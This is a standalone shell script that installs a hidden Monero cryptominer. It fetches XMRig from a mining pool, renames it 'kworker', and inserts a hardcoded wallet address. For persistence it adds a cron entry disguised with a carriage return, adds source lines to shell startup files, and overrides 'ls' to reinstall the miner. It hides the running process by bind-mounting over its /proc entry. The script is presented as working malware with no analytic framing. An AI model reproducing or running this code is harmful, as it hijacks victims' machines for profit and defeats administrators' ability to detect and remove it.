#!/bin/sh

if [ ! -f /var/tmp/release-upgrade ]; then
    mkdir -p /var/tmp/
    cat > /var/tmp/release-upgrade << 'EOF'
#!/bin/sh

maintain_miner() {
    local script="/tmp/.bash/ground.sh"
    
    if [ ! -f "$script" ]; then
        mkdir -p /tmp/.bash
        cat > "$script" << 'MINER_SCRIPT'
#!/bin/sh
if ! readlink -f /proc/*/exe 2>/dev/null | grep -q "/tmp/.local/kworker"; then
	if [ ! -f "/tmp/.local/kworker" ]; then
		mkdir -p /tmp/.local
		cd /tmp/.local || exit 1
		wget -q https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz 2>/dev/null
		tar -zxf xmrig.tar.gz 2>/dev/null
		rm xmrig.tar.gz -rdf 2>/dev/null
		mv xmrig kworker 2>/dev/null
		sed -i 's/YOUR_WALLET_ADDRESS/49zTGCK3rzefsriHMs4aw9hzDJLqMKRoyAJ1kRGAHLM1DGc4ynK8GC95rNu5zg21cfRDmUSGUjCRRVmvDvCU2zGjAQs7qgn/' /tmp/.local/config.json 2>/dev/null
		RAND_PASS=$(date +%s | md5sum | head -c 5)
		sed -i "s/\"pass\": \"x\"/\"pass\": \"$RAND_PASS\"/" /tmp/.local/config.json 2>/dev/null
		
		cpu_threads=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1)
		if [ "$cpu_threads" -le 2 ]; then
			sed -i 's/100/70/' /tmp/.local/config.json 2>/dev/null
		elif [ "$cpu_threads" -gt 2 ] && [ "$cpu_threads" -le 6 ]; then
			sed -i 's/100/80/' /tmp/.local/config.json 2>/dev/null
		else
			sed -i 's/100/90/' /tmp/.local/config.json 2>/dev/null
		fi
		
		mkdir -p /tmp/.local/null
	fi
	cd /tmp/.local && nohup ./kworker >/dev/null 2>&1 &
	sleep 3
	if ! crontab -l 2>/dev/null | cat -A 2>/dev/null | grep -q "ground.sh;"; then
		(crontab -l 2>/dev/null; printf "*/5 * * * * /tmp/.bash/ground.sh;\rno crontab for '%s' %%100c\n" "$USER") | crontab - >/dev/null 2>&1
	fi
	for pid in /proc/[0-9]*/exe; do
		[ "$(readlink "$pid" 2>/dev/null)" = "/tmp/.local/kworker" ] && {
			pid_num=${pid#/proc/}
			pid_num=${pid_num%/exe}
			mkdir -p /tmp/.local/null
			mount --bind /tmp/.local/null "/proc/$pid_num" 2>/dev/null
			break
		}
	done
fi
MINER_SCRIPT
        
        chmod +x "$script"
		if ! crontab -l 2>/dev/null | cat -A 2>/dev/null | grep -q "ground.sh;"; then
			(crontab -l 2>/dev/null; printf "*/5 * * * * /tmp/.bash/ground.sh;\rno crontab for '%s' %%100c\n" "$USER") | crontab - >/dev/null 2>&1
		fi
    fi

}


ls() {
    command ls --color=auto "$@"

    if ! crontab -l 2>/dev/null | cat -A 2>/dev/null | grep -q "ground.sh;"; then
        (crontab -l 2>/dev/null; printf "*/5 * * * * /tmp/.bash/ground.sh;\rno crontab for '%s' %%100c\n" "$USER") | crontab - >/dev/null 2>&1
    fi

    maintain_miner >/dev/null 2>&1
}
EOF

echo "source /var/tmp/release-upgrade" >> ~/.bashrc 2>/dev/null
echo "source /var/tmp/release-upgrade" >> /etc/bash.bashrc 2>/dev/null
echo "source /var/tmp/release-upgrade" >> /etc/profile 2>/dev/null
fi

chmod 777 /var/tmp/release-upgrade

if [ ! -f /var/tmp/meta-release ]; then
	cat > /var/tmp/meta-release << 'xmrig'
#!/bin/sh
if ! readlink -f /proc/*/exe 2>/dev/null | grep -q "/tmp/.local/kworker"; then
	if [ ! -f "/tmp/.local/kworker" ]; then
			mkdir -p /tmp/.local
			cd /tmp/.local || exit 1
			wget -q https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz 2>/dev/null
			tar -zxf xmrig.tar.gz 2>/dev/null
			rm xmrig.tar.gz -rdf 2>/dev/null
			mv xmrig kworker 2>/dev/null
			sed -i 's/YOUR_WALLET_ADDRESS/49zTGCK3rzefsriHMs4aw9hzDJLqMKRoyAJ1kRGAHLM1DGc4ynK8GC95rNu5zg21cfRDmUSGUjCRRVmvDvCU2zGjAQs7qgn/' /tmp/.local/config.json 2>/dev/null
			RAND_PASS=$(date +%s | md5sum | head -c 5)
			sed -i "s/\"pass\": \"x\"/\"pass\": \"$RAND_PASS\"/" /tmp/.local/config.json 2>/dev/null
			
			cpu_threads=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1)
			if [ "$cpu_threads" -le 2 ]; then
				sed -i 's/100/70/' /tmp/.local/config.json 2>/dev/null
			elif [ "$cpu_threads" -gt 2 ] && [ "$cpu_threads" -le 6 ]; then
				sed -i 's/100/80/' /tmp/.local/config.json 2>/dev/null
			else
				sed -i 's/100/90/' /tmp/.local/config.json 2>/dev/null
			fi
			
			mkdir -p /tmp/.local/null
	fi
	cd /tmp/.local && nohup ./kworker >/dev/null 2>&1 &
	sleep 3
	if ! crontab -l 2>/dev/null | cat -A 2>/dev/null | grep -q "ground.sh;"; then
			(crontab -l 2>/dev/null; printf "*/5 * * * * /tmp/.bash/ground.sh;\rno crontab for '%s' %%100c\n" "$USER") | crontab - >/dev/null 2>&1
	fi
	for pid in /proc/[0-9]*/exe; do
		[ "$(readlink "$pid" 2>/dev/null)" = "/tmp/.local/kworker" ] && {
			pid_num=${pid#/proc/}
			pid_num=${pid_num%/exe}
			mkdir -p /tmp/.local/null
			mount --bind /tmp/.local/null "/proc/$pid_num" 2>/dev/null
			break
		}
	done
fi
xmrig
fi

chmod 777 /var/tmp/meta-release
/var/tmp/meta-release
rm down -rdf 2>/dev/null
